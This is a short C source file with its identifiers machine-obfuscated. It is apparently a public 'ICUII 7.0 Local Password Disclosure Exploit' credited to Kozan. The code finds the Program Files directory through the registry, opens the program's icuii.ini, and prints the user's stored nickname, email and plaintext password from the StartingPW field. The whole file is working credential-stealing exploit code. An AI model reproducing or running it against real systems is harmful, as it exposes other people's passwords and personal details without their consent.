
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int LPBYTE ;


 scalar_t__ VAR_0 ;
 scalar_t__ VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int FUNC_0 (int ) ;
 scalar_t__ FUNC_1 (int ,char*,int ,int ,int *) ;
 scalar_t__ FUNC_2 (int ,char*,int *,int *,int ,scalar_t__*) ;
 scalar_t__ VAR_4 ;
 int VAR_5 ;
 scalar_t__ VAR_6 ;
 char* FUNC_3 (scalar_t__,char*) ;
 scalar_t__ VAR_7 ;
 int FUNC_4 (char*,...) ;
 int FUNC_5 (scalar_t__,char*) ;

int FUNC_6()
{
       if(FUNC_1(VAR_2,
                                       "SOFTWARE\\Microsoft\\Windows\\CurrentVersion",
                                       0,
                                       VAR_3,
                                       &VAR_5
                                       ) == VAR_1)
       {
       VAR_6 = FUNC_2( VAR_5, "ProgramFilesDir", ((void*)0), ((void*)0),(LPBYTE) VAR_7,
&VAR_4);
       if( (VAR_6 != VAR_1) || (VAR_4 > VAR_0) )
       {
               FUNC_0(VAR_5);
               FUNC_4("An error occured!\n");
               return -1;
       }
       FUNC_0(VAR_5);
       }

       FUNC_5(VAR_7,"\\icuii\\icuii.ini");

       if(FUNC_3(VAR_7,"NickName=")=="")
       {
               FUNC_4("ICUII is not installed on your system!\n");
               return -1;
       }

       FUNC_4("ICUII 7.0 Local Password Disclosure Exploit by Kozan\n");
       FUNC_4("Credits to ATmaCA\n");
       FUNC_4("www.netmagister.com - www.spyinstructors.com\n");
       FUNC_4("kozan@netmagister.com\n\n");

       FUNC_4("Nickname: %s\n",FUNC_3(VAR_7,"NickName="));
       FUNC_4("Location: %s\n",FUNC_3(VAR_7,"Location="));
       FUNC_4("Comment : %s\n",FUNC_3(VAR_7,"Comment="));
       FUNC_4("E-Mail  : %s\n",FUNC_3(VAR_7,"Email="));
       FUNC_4("Password: %s\n",FUNC_3(VAR_7,"StartingPW="));






       return 0;
}
